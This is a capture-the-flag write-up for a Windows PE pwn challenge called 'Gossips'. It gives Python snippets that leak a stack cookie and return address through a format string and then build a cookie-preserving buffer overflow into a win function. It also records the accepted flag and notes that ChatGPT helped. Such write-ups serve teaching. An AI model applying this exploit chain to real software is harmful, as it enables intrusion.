# Gossips — NEXSEC 2026 CTF

| Field | Details |
| --- | --- |
| Team | Eureka |
| Category | PWN |
| Points | Not confirmed in recovered records |
| Service | `koala.nexsec.my:35563` |
| Technique | Format-string leak, stack-cookie preservation, PE image-base leak, ret2win |
| Status | Solved |

## Challenge

The remote application introduced itself as a gossip board that would repeat anything it was told:

```text
=== gossips: the watercooler that never forgets ===
   (tell it anything. it tells everyone.)

[gossips] before you sit down... who are you?
[gossips] so... tell me a secret. i PROMISE i won't tell anyone.
[gossips] last words before it all burns?
```

The goal was to turn its chat-style inputs into an exploit that reached the flag-revealing function. The working solution used **two separate weaknesses**: the "secret" stage exposed stack data through a format string, and the final input could overwrite a saved return address.

## Leaking the stack

The secret input was interpreted as a format string rather than printed as ordinary user-controlled text. Supplying a sequence of `%p` specifiers therefore disclosed values from the current call frame.

The final exploit used 47 pointer conversions, separated by dots:

```python
RETURN_ARG_INDEX = 47
fmt = b'%p.' * RETURN_ARG_INDEX + b'\n'
sock.sendall(fmt)
```

A sample response from the investigation contained addresses formatted in hexadecimal, such as:

```text
[gossips] wow. okay. well:
00000001400250D8.00007FFFFE1FFCF0.000000007FFC3441....
```

The **44th** leaked value corresponded to the saved stack cookie, and the **47th** was the return address needed to derive the PE image base. These indices are not interchangeable with raw zero-based Python list indices, which is why the exploit uses `index - 1` when parsing the leak.

```python
CANARY_ARG_INDEX = 44
RETURN_ARG_INDEX = 47

cookie = int(tokens[CANARY_ARG_INDEX - 1], 16)
caller_ret = int(tokens[RETURN_ARG_INDEX - 1], 16)
```

The recovered cookie allowed us to preserve the correct security value during the later overflow. The return address supplied a runtime anchor despite image randomization.

## Computing useful addresses

The executable in the challenge was a **Windows PE** binary, so the exploit worked with offsets relative to the image base. From the examined executable layout, the offset of the leaked caller return address was `0x15f0`.

The script then calculated:

```python
RETURN_RVA = 0x15f0
WIN_RVA = 0x1000
RET_GADGET_RVA = 0x10e7

base = caller_ret - RETURN_RVA
win_addr = base + WIN_RVA
ret_gadget = base + RET_GADGET_RVA
```

The address at `base + 0x1000` was the flag function. A single-instruction `ret` gadget at `base + 0x10e7` was used before that function to align the stack for the Windows x64 calling convention.

## Building the final overflow

In the final input, the controlled buffer began `0x110` bytes before the saved security cookie. By leaking the cookie first, we could overwrite the buffer and place the original cookie back at its expected position instead of failing the stack-protection check.

The payload was constructed in this order:

| Offset in payload | Content | Size |
| --- | --- | --- |
| `0x000` | `A` padding up to the cookie | `0x110` |
| `0x110` | Previously leaked stack cookie | `0x08` |
| `0x118` | `B` padding across the remaining saved-state area | `0x10` |
| `0x128` | Alignment `ret` gadget | `0x08` |
| `0x130` | Address of flag function | `0x08` |
| **Total** | | **`0x138`** |

The working script represented that as:

```python
payload  = b'A' * 0x110
payload += p64(cookie)
payload += b'B' * 0x10
payload += p64(ret_gadget)
payload += p64(win_addr)
assert len(payload) == 0x138
sock.sendall(payload)
```

The initial, shorter return sequence was not the final working approach. Adding the alignment gadget before the flag function was part of the corrected exploit.

## Result

The Python script performed the whole sequence over a single service connection:

1. Submit a username (`guest`).
2. Send the format-string leak to the secret prompt.
3. Extract the stack cookie and return address.
4. Calculate the runtime PE base, the alignment gadget, and the flag function.
5. Send the overflow at the final prompt and read the service response.

The corrected exploit successfully reached the flag function. The flag submitted for the challenge was accepted:

```text
nexsec26{3bc38871b4313662863c62545c9f30cb0d09a4b379d0029b3ac96e344fa09539}
```

## Step-by-step solution summary

1. Connect to the service and submit `guest` at the username prompt.
2. Send the 47-pointer format string shown above at the secret prompt.
3. Extract the 44th leaked value as the saved cookie and the 47th as the caller return address.
4. Calculate the PE base and the two return targets using the documented RVAs.
5. Build the `0x138`-byte payload using the leaked cookie, padding, alignment gadget, and flag-function address.
6. Submit it at the final prompt on the same TCP connection, so the runtime values remain those disclosed by the leak.
7. Read the response from the flag function. The recorded flag is shown in **Result** and **Flag**.

## Supporting evidence and verification

The excerpt in **Leaking the stack** records the exposed stack values. The original solving conversation records the corrected exploit's flag and the user's confirmation that it was accepted.

The recovered Python solution passed a syntax check. The documented payload layout is `0x110 + 8 + 0x10 + 8 + 8 = 0x138` bytes, matching the original assertion.

The client uses Python 3's standard library. The Windows PE target runs on the challenge host; the client does not require Windows. The leak indices and RVAs are specific to the original challenge build. The target and remote exploit were not re-run during this documentation update.

## Flag

```text
nexsec26{3bc38871b4313662863c62545c9f30cb0d09a4b379d0029b3ac96e344fa09539}
```

## Takeaway

The format-string leak and the buffer overflow were individually useful, but combining them defeated the two major obstacles: stack-cookie verification and PE address randomization. With the cookie restored in the overflow and the runtime base known, a short return chain could jump to the flag routine.

## AI assistance and chat history

**Tool:** ChatGPT.

ChatGPT assisted with challenge analysis, exploit development and troubleshooting, and preparation and revision of this write-up.

**Relevant original conversation:** “Binary Exploitation Writeup” (Gossips).

**Original chat-history link:** Not yet supplied. Provide the genuine, accessible link to the original solving conversation if requested by the organisers. This write-up does not replace the original chat history. Any additional AI assistance used by team members should also be disclosed.
